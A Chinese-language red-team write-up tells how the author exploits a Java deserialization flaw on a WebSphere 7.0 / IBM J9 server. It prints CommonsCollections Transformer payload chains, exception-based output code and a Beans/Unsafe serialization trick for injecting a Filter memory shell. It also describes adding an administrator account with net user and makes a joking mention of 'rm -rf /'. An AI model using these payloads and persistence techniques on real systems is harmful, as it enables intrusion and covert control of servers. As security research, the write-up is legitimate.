最近做交付项目写代码比较多，做研究比较少，没什么好分享的，水一篇利用记录。

本文为梦游时编写，记录梦中所见，文章中图片皆为 PS，切勿当真。

0x01 前情提要
=========

某年某月的某一天，就像一张破碎的脸；难以开口道再见，就让一切走远。

我正在开发安全工具，一位 Java 的神突然出现，问我：“你在开发吗，要不要看下这个站？”

我很诧异，还有 Java 的神解决不了的站？

定睛一看，是目标内网里面的一个系统，接口存在反序列化漏洞。

Java 的神给出如下信息：

1. CC6 延时成功；
2. 内存马没打成功；
3. 目标环境里没有 TemplatesImpl。

我心想，这有什么难的？Java 的神分明是觉得日站太无聊，想要去挖洞了！无所谓！看我掏出 Ysuserial 给他秒了！然后继续写我的工具去。

正是这个念头，开启了我的被折磨之旅。

0x02 漏洞利用（捞的不谈）
===============

日反序列化漏洞首先当然是探测利用链，找到最好打最方便不出网的链子，然后一把梭。这里由于 Java 的神给出 CC6 这个信息，我当然无条件信任，因此省略探测其他利用链的过程。

简单说一下 CC6 利用，由于CC6 最终使用 `Transformer[]` 的方式进行利用，不出网的代码执行在 Ysuserial 中存在几种：

1. 使用 BCEL 执行：
    
    ```java
    bcelBytes = generateBCELFormClassBytes(encapsulationByClassLoaderTemplate(generateClass(command, config).toBytecode(), false, config).toBytecode());
    transformers = new Transformer[]{new ConstantTransformer(com.sun.org.apache.bcel.internal.util.ClassLoader.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{}}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new String[]{}}), new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{bcelBytes}), new InvokerTransformer("newInstance", new Class[0], new Object[0]), new ConstantTransformer(1)};
    ```
    
    可以看到有个方法 `encapsulationByClassLoaderTemplate` ，由于 BCEL 类加载器的特殊性，想打内存马的话要对封装一下使用线程类加载器，否则会找不到类。
2. 使用 ScriptEngineManager JS eval 执行 JS 代码：
    
    ```java
    transformers = new Transformer[]{new ConstantTransformer(ScriptEngineManager.class), new InvokerTransformer("newInstance", new Class[0], new Object[0]), new InvokerTransformer("getEngineByName", new Class[]{String.class}, new Object[]{"JavaScript"}), new InvokerTransformer("eval", new Class[]{String.class}, new Object[]{generateJS(ctClass.toBytecode(), config)})};
    ```
    
    比较常见的利用，`generateJS` 方法还可以根据实际情况有所变化。
3. 使用 `org.mozilla.javascript.DefiningClassLoader`进行类加载
    
    ```java
    transformers = new Transformer[]{new ConstantTransformer(org.mozilla.javascript.DefiningClassLoader.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}), new InvokerTransformer("defineClass", new Class[]{String.class, byte[].class}, new Object[]{ctClass.getName(), ctClass.toBytecode()}), new InvokerTransformer("newInstance", new Class[0], new Object[0]), new ConstantTransformer(1)};
    ```
    
    这种姿势最早使用在著名的漏洞靶场 NC 中。

链式调用也还有很多姿势，这些代码早就集成在 Ysuserial 中了，属于 Java 安全基础知识，捞的不谈。于是掏出 Ysuseral 生成内存马准备一把梭。

![image-20240524092858859.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-3d1c351e9e126d82d158550d8bee17c485ab5bd3.png)

发送 payload 应用程序返回报错。

![image-20240523181846703.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-e084636f63dd7f423594670722cc1ade110e2f2c.png)

看报错应该是 JS 代码的反射写法没用兼容到 mozilla js 的语法，这有点奇怪，我记得我兼容过了，不过不纠结，直接用 `org.mozilla.javascript.DefiningClassLoader`，但这同时说明 JS 语句执行了，证明链子是能用的。在 Ysuserial 上勾选之后再次生成，程序返回报错。

![image-20240523181811664.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-c5854483e2050a5afdd4fdc19a4f39f3d74e19af.png)

这个报错就正常了，熟悉反序列化的朋友知道，一般 readObject 之后通常会给一个强转，此时通过利用链打入后，执行结束一般会返回类型错误或不符等报错，符合我们利用的预期。

而另外一种姿势 BCEL 在此环境中也是不可用的，因为目标环境中没有 BCEL ClassLoader。

漏洞利用没问题，接下来开启打马之路。

0x03 初次尝试
=========

① Request 回显/直打内存马 - 失败
-----------------------

刚才生成的马打完之后，发现连不上。

这其实是我的坏习惯，因为积累了一些代码，我的内存马代码在大多数中间件版本和JDK版本上都是兼容的，因此基本都是直接打马，直接连，大多数时候都是能直接连上的。

而显而易见，本次就是少数部分。这时一般我会重新尝试使用 Request 回显技术进行尝试，重新使用 Ysuserial 生成回显 payload 如下，同时在访问时带上请求 `X-Token-Data`。（没有炫耀我写的工具的意思）

![image-20240524094943293.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-135d12c27459e52ec78c4f587579cdd61c710069.png)

结果发现也没有成功回显。

这结果让我大吃一惊，通常情况下使用内存马失败的情况下，可能是内存马的 BUG 或兼容性问题，但如果中间件的架构不变，一般回显是可以的，所以这里面一定有很大的坑。

通过服务器的返回可以得知，目标服务器为 WebSphere Application Server/7.0，这个版本还是比较老的，也比较少见，平常遇到的版本一般为 8.5 或 9 这种比较高的版本，因此还真有可能是内存马的版本没有适配。

由于适配内存马可能需要本地环境及调试，需要大量时间，因此还是先想办法拿权限。

② Agent 马 - 耻辱失败
----------------

在这种代码看起来是执行了，但是不知道为什么回显不成功，内存马也没打进去的情况下，最好的方式是使用 Java Agent 马进行利用。

Java Agent 马可以选取 Servlet-API、中间件乃至业务代码进行 Hook，因此可以屏蔽绝大部分的中间件版本差异。

于是再一次掏出了我赖以成名的 Agent 马项目准备直接冲。

先通过写文件操作将 Agent Jar 包写到一个目录，然后再执行加载，并执行关键类，执行代码如下：

```java
new URLClassLoader(new java.net.URL[]{new File("xxxx.jar").toURI().toURL()}).loadClass("Agent").newInstance();
```

此时 Agent 马会执行 self attach，并打入我们想要的内存马。

Payload 发送，此时我都已经准备好跟 Java 的神炫耀，我使用了 Agent 马一发入魂，结果发现目标报错提示类名无效。

![image-20240523182051978.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-2a9edd2dcb0635c5424b16a8363275ac7ca5902e.png)

此类名则是我刚才加载的类名，类名无效这个错还是第一次见到，当时也不知道是为什么。Java 的神表示已经尝试过这种方式，程序出现报错。

通过后来本地搭建环境复现得知，目标环境使用 IBM j9 jdk 1.6 版本，此版本的 JDK 并不支持目前我使用的混淆技术，因此类加载的时候再解析混淆后的类字节码会出现报错，无法正常加载。

再尝试了多次之后，最终选择了放弃，可以说是耻辱失败，我赖以成名的 Agent 马在实战中没有解决常规内存马不能用的问题，这让我很没有面子。

③ 写文件 JSP 马 - 未知原因失败
--------------------

不过在上面的尝试中可以发现，有一部分报错会被回显出来，那是不是可以通过在自定义代码中抛出异常来进行回显呢？

经过尝试，我发现抛出 `java.lang.ClassFormatError` 异常可以回显在页面上，例如如下代码可以列目录。

```java
public A() {
        List  strings = Arrays.asList(new File(".").list());
        StringBuilder sb      = new StringBuilder();
        for (int i = 0; i &lt; strings.size(); i++) {
            sb.append(strings.get(i)).append("|");
        }
        throw new ClassFormatError(sb.toString());
    }
```

程序回显：

![image-20240523182026329.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-4d6844b14e73bd2c5ee612a86bedb36db321184e.png)

此时我们拥有了执行代码并回显的能力，就可以列举目录并尝试找到 web 路径，然后进行写文件马 GetShell 了。

WAS 的安装路径一般为 `~\was\profiles\AppSrv01\installedApps\节点\xxx.ear\`，在这个目录下面的 `xxx.war` 下放置 JSP 即可通过 web 访问。

通过文件写将马写入 web 路径，就当我再一次以为我要成功了之后，我发现——写入的 JSP 访问后请求会卡死。莫非是目标环境不允许新 jsp 编译吗？

此时我想将 webshell 代码插入到已有的 JSP 中，但是想想还是算了，如果导致已有 JSP 卡死而影响业务的话，问题就大了。

在尝试了 jsp/jspx，各种不同路径之后，还是无法正常getshell，此时最终也只能放弃。

因为尝试了几种手段，都没能 getshell，此时心情已经比较急躁，事后想到如果在 installedApps 目录的节点中直接写一个 WAR/EAR 包，能否访问呢？

④ 命令执行添加用户 + 3389 连接 - 勉强控下
---------------------------

虽然目前已经有了代码执行 + 回显的能力，但是 getshell 失败，也不能在控制时翻个文件什么的也要通过漏洞去打。

由于目标环境不出网，想来想去没有更简单快捷的办法了，选择命令执行添加用户 + 3389 连接，由于目标在内网里，是突破边界后通过转发进入内网，因此可以远程桌面连接。

使用命令执行 `net user /add` 添加用户，并将用户添加到管理员组里（捞的淌口水），返回命令成功完成，执行没有被拦截。

![image-20240523181906387.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-ff226ffd459f9ec7dccea6963617f59186cf1dd6.png)

顺便看下当前用户。

![image-20240523181922770.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-d67017b41bafaebbb8f438b9ca9fc8b485857199.png)

最终成功登陆 3389，第一天结束，关机下班，底薪到手。

0x04 本地环境搭建
===========

时间来到了第二天，由于对目标是通过代理访问，因此通过 RDP 进行远程桌面，点一次鼠标要等待 10 秒左右才能得到结果，这不利于扩大战果。

虽然能证明拿到了权限，但是折腾了半天连个控制都没上，而且对于内存马深度技术研究者，这个结果我实在不能接受，太丑陋了。打了一天马没写进去，最后命令执行添加用户，这攻击路径说出去怕被人笑话。而且如果未来遇到执行命令有告警或者防御的，岂不是只能干瞪眼，于是决定本地搭建环境进行调试。

在网上搜了半天发现 CSDN 有一个收费的下载链接。通过使用大召唤术：

![image-20240524105531998.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-772b5aa68ad7577d9a58edca818bcef9b601d97c.png)

3 分钟之后，获得下载链接。

![image-20240524105600415.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-95da3098dfc70ebf1d2ec341c05012061c666534.png)

下载、安装、开启远程调试过程不谈，直接开始代码研究。测试时通过一个类加载的 JSP，将我们的内存马注入代码写入，进行 DEBUG 及查看。

如果你对内存马技术有所积累或对此中间件比较感兴趣，可以暂停查看本文章，并通过上图链接自行下载搭建尝试。

WAS 7.0 里面内置 IBM J9 jdk 1.6，这两个环境加起来和其他中间件有很大区别。调试的过程比我想想的时间要长，里面坑点很多。这里不一一贴代码赘述，直接给出一些关键技术点以及坑点。

① IBM J9 的实例化校验机制？
------------------

以 Filter 内存马为例，在请求到达中间件时，中间件会根据请求路径等信息，创建和管理一个 Filter Chain，并依次执行。因此在打入内存马时会同步打入一些配置信息，如路径与类名或类 Class 的映射，在 WAS 中为类名。中间件会使用这个类名在相关的 ClassLoader 中实例化一个个 Filter 出来，储存管理并执行。

在内存马测试过程中，出现了一个令人难以置信的问题：使用同一个 ClassLoader define 成功并且返回的 Class，竟然无法使用 `newInstance()` 创建类实例。

太离谱了！实在是太离谱了！想象一下，下面这个常见的类加载代码，在倒数第二行成功返回一个 Class 对象，但是在最后一行却抛出了异常。

```java
Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
defineClass.setAccessible(true);
Class filterClass = (Class)defineClass.invoke(Thread.currentThread().getContextClassLoader(), clazzByte, 0, clazzByte.length);
filterClass.newInstance();
```

看一下 IBM JDK 的 `Class.newInstance()` 方法，调用了 J9 自实现的 `J9VMInternals.newInstanceImpl()` 方法，这是一个 native 方法。

![image-20240524180552319.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-e66e02e5c45c784e2a6acf9e5f5046e06ad86fce.png)

通过 Debug 中的调用堆栈，可以看到最终由 J9VMInternals 的 native 方法 `verifyImpl()` 抛出异常。

由于这是一个闭源 JDK，网上相关的内容又不多，暂时没有找到该如何处理这个问题，但是通过搜索官网上的 Support 中相似报错堆栈的记录，可以发现，可能是因为该类没有在 class path 中找到。

![image-20240524184424691.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-9f10d5a470aa5e0da26cbc3f4725d96f7c1a860f.png)

后来搜索开源的 OpenJ9 的源代码，发现代码结构改动也比较大，看起来不具有太多的参考性。

再后来经过反复重启本地服务器，我发现这个问题并不是能稳定复现，有时可以创建类实例，有时又不行，这可能就是 IBM 的 BUG，哦不，是 IBM 的禅学，告诉我们，这世界上就是充满了有趣的不确定性。

这里只能推测是在 j9 实例化一个类的时候存在某种校验机制，在某些未知条件下可能会导致抛出异常，实例化类失败。

后来经过对实际目标的在线调试，发现也在此处抛出异常，因此还是需要解决此问题，也是为了工具化以后实战利用的稳定性，姑且认为，此处可以在目标 ClassLoader 定义类，但是无法通过 `newInstance()` 正常获取类实例。

（事后推测，是否有可能目标服务器 JVM 占满内存导致无法实例化类？verifyImpl 方法里是否有对内存的校验？）

② WAS 类加载机制
-----------

资料：<https://www.redbooks.ibm.com/redpapers/pdfs/redp4581.pdf>

总体来说依旧是双亲委派，用来加载Web应用的类加载器为`com.ibm.ws.classloader.CompoundClassLoader`，这个类加载器的实现太“精彩”了，建议大家熟读并背诵。

经过反复思索，最终还是觉得，是类加载器的某些问题导致即使 defineClass 成功也无法实例化类。

因为在这个类加载器发现了一个额外的方法 `defineApplicationClass`，使用这个方法会使用一个如下 ProtectionDomain 进行 defineClass。

```java
PermissionCollection pc = new Permissions();  
pc.add(new AllPermission());  
svPD = new ProtectionDomain((CodeSource)null, pc);
```

而经常使用的反射直接调用 defineClass 方法此对象则为空，因此推测可能实例化时对此对象进行了校验。

③ Filter 管理时的类实例化验证机制
---------------------

对于这种无法理解的 BUG，处理上有些无解，但是天无绝人之路，经过测试发现，还可以用过 Java Beans 的实例化机制来进行绕过。

在请求到达 WAS 时，管理和创建 Filter 的类为 `com.ibm.ws.webcontainer.filter.WebAppFilterManager`，此时会调用 `Beans.instantiate(this.webApp.getClassLoader(), filterClass)` 来进行 filter 实例的初始化。

![image-20240524113325317.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-51f066cac75c463f2ab1f01389a7bf32300d5602.png)

`this.webApp.getClassLoader()` 即是 `com.ibm.ws.classloader.CompoundClassLoader`。

这个实例化的方式在现代化中间件里比较少见，但是在早期的支持 EJB 技术的框架中被广泛应用。要理解这个代码的设计初心，首先要了解的是，什么是 Java Bean? 我简单贴几篇文章：

- <https://stackoverflow.com/questions/3295496/what-is-a-javabean-exactly>
- <https://zh.wikipedia.org/wiki/JavaBeans>
- <https://www.geeksforgeeks.org/javabean-class-java/>

简单来说，就是按照希望设计的，并且能够使用原生序列化保存的 Java 类，因此，在类创建实例时，如果在对应的 ClassLoader 中已经有保存的对象，将通过序列化进行读取。如果没有保存的对象，则通过传入的 ClassLoader 或 System ClassLoader 进行寻找，找到后再进行 `newInstance()`。

![image-20240524114047403.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-9b43243c716e4081cad56bf51d380f2b3cdaaf88.png)

这样就柳暗花明又一村了。我们来看一下 `com.ibm.ws.classloader.CompoundClassLoader` 这个 ClassLoader，这个类有个成员变量，用于缓存加载过的类对象。

![image-20240524154640583.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-2bf5a8fea03b8783c2e94ae5081ab4b2d0a5a662.png)

我们可以将内存马 Filter 实现 Serializable，并将其序列化结果写入某个位置，并将其映射存放在 resourceRequestCache 里面。此时就可以通过 Beans 实例化过程返回结果从而绕过 `newInstance()` 方法抛出的异常，代码如下：

```java
String tempFile = System.getProperty("java.io.tmpdir") + File.separator + "test.ser";
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(tempFile));
oos.writeObject(filter);
oos.flush();
oos.close();

Map map = (Map) getFV(loader, "resourceRequestCache");
map.put("com/mongodb/WebChainProxyFilter.ser", new File(tempFile).toURI().toURL());
```

此时在 `Beans.instantiate()` 时，CompoundClassLoader 会读取序列化数据并反序列化，从而创建类实例。而不会走到下面的 `newInstance()` 触发报错。

而反序列化流程使用 `ReflectionFactory.newConstructor()` 来创建创建 Constructor，并使用 Constructor 创建类实例，而这个流程在细节上可能与 `Class.newInstance()` 有所不同，可以绕过。

由于是使用 URL 对象来获取资源，因此其实也不必要落地文件，在内存中映射也可以。

这时有朋友就问了，你使用反序列化来解决类创建的问题，那岂不是要先有一个类实例吗？这难道不是先有鸡还是先有蛋的问题吗？

很简单，序列化数据在哪都能生成，想在目标环境中生成也可以，使用 unsafe 即可。

```java
Field field = Unsafe.class.getDeclaredField("theUnsafe");
field.setAccessible(true);
Unsafe unsafe = (Unsafe) field.get(null);
filter = unsafe.allocateInstance(filterClass);
```

④ 注入器二三事
--------

在解决了实例化问题后，接下来就是解决内存马注入器的问题了，这里面和其他内存马注入区别不大。

总体还是通过内存搜索的技术，找到应用程序的关键上下文，并向启动管理 Filter （或其他类型）的位置加入恶意类，然后将打入的恶意类添加至首位。

但值得注意的是，Websphere 为了节约资源，在请求一个路径后，会为这个路径的各种相关信息进行缓存，下次请求时，将会优先从缓存中查找，如果没有才会重新加载。

![image-20240524182018247.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-f5b529acdca9938ee32e8f8a6fe2d15d8135c656.png)

这也就意味着，在我们的内存马打入后，必须要请求一个之前没有请求过的新路径才可以。在实战中我们显然找不到那么多新路径，因此在注入逻辑后需要手动清空缓存。

⑤ 内存马配合修改
---------

在经过上面几个环节的技术研究后，我们的内存马需要进行如下修改：

1. 由于使用 Java Beans 实例化进行绕过，因此内存马 Filter 需要实现 Serializable；
2. 前面使用了 Unsafe 来创建内存马 Filter 的类实例并序列化保存，这里就需要额外注意，使用 Unsafe 的 allocateInstance 方法创建的类，其非静态成员变量均未进行初始化，有些内存马生成工具（比如我写的 ysuserial ）是通过修改类中的成员变量值来进行生成的，因此需要修改下相关逻辑，不影响正常使用。
3. 经过测试使用 `response.getWriter()` 向返回结果中写内容未生效，暂时没有研究是为什么，使用 `response.getOutputStream()` 写入即可，推测这也是为什么之前回显没有成功的原因。

⑥ 上线吧，我的马
---------

最终，打了个哥斯拉，上线吧！

![image-20240524160629925.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-36cb24cc71bf3d25615a51c64586893ea95f8b6f.png)

0x05 回到实战环境
===========

在本地环境成功打入内存马后，我欣喜若狂，直接去目标环境，准备扬眉吐气！哼哼，小小应用，准备好迎接爸爸的大 Webshell 了吗？

① 一顿操作猛如虎，一看战绩 0/5
------------------

一发 payload 过去，嘿，您猜怎么着？果不其然——依然没有成功，连不上。

就当我准备在目标上使用命令执行 `rm -rf /` 时并且提交离职申请时，我突然想到，是不是还有什么差异化的东西？通过之前的回显方式我发现，果不其然，获取当前 web 应用 Context 数量为 0 。

![image-20240523181710035.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-8aac35192fd2e2d7ae2c402924a80008c9c443fd.png)

根据这个情况，我有几个猜测：

- 测试环境使用 JSP 加载，而目标环境使用漏洞利用，有可能获取 Context 的路径不同；
- web 应用小版本还有代码差异。

② 性感 Java，在线调试
--------------

十八拜都拜了，不差这一哆嗦了。于是继续使用回显方式，重新寻找注入路径。

![image-20240523181727972.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-ec5e9762bef988742e41b4cc8d1dfc0a8e2d2bfe.png)

经过一段时间不长不短的查找，最后更换搜索路径，找到关键上下文，这基本等于在线黑盒调试内存马了。

好在最后终于成功注入，加载内存马并清除缓存。

![image-20240523181654448.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-9363d7b93619c68c4487ca01b3408fc4c5c352e1.png)

③ 上线吧，我的马
---------

这个图不贴你也知道，肯定是成功上线了。让我们恭喜 su18。

0x06 总结
=======

一个如此简单的反序列化漏洞，平常打内存马大概要花两秒，还有一秒在等待工具打开；而此次总共耗时两天时间，才最终以内存马的方式拿下了这个站，过程些许艰辛。

从技术角度来看，虽然是非常简单的排错过程，但很多思路很有意思，中间几次想放弃，最终还是走到了最后，我觉得很适合学习内存马的朋友研究研究，也作为对实战环境的积累。

不得不说 IBM JDK 也着实有点东西，理论上来说，IBM JDK 确实更加的安全，但是对于攻击者视角来就比较折磨，下次有机会再给大家分享被 IBM JDK 折磨的其他故事。

总结：菜就多练。